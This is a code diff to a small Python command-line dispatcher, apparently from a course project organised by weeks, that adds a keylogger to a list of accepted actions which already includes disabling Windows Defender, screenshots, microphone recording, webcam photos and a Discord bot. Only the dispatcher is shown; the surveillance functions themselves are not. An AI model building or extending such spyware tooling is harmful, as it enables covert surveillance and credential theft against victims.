@@ -5,6 +5,7 @@ from week_2.discord_bot import start_bot
 from week_3.screenshot.take_screenshot import take_screenshot
 from week_3.mic.record_mic import record_mic, list_audio_devices
 from week_3.camerav2 import maak_foto
+from week_5.keylogger import start_logger
 
 accepted_functions = ["disable_defender",
                       "ps",
@@ -12,8 +13,9 @@ accepted_functions = ["disable_defender",
                       "start_discord_bot",
                       "take_screenshot",
                       "record_mic",
-                      "list_audio_devices"
-                      "maak_foto"
+                      "list_audio_devices",
+                      "maak_foto",
+                      "keylogger"
                       ]
 
 
@@ -55,6 +57,8 @@ def main(action):
                     f"er ging iets mis tijdens het ophalen van apparaten: {result}")
         case "maak_foto":
             click.echo(maak_foto("./", "foto"))
+        case "keylogger":
+            start_logger()
 
 
 if __name__ == '__main__':
@@ -63,4 +67,4 @@ if __name__ == '__main__':
 
 # TODO: Implement check for the available audio devices
 # TODO: Implement info on available monitors, and make it possible for end user to select a monitor to capture
-# TODO make it possible to specify the amount of seconds to record.
+# TODO: make it possible to specify the amount of seconds to record.
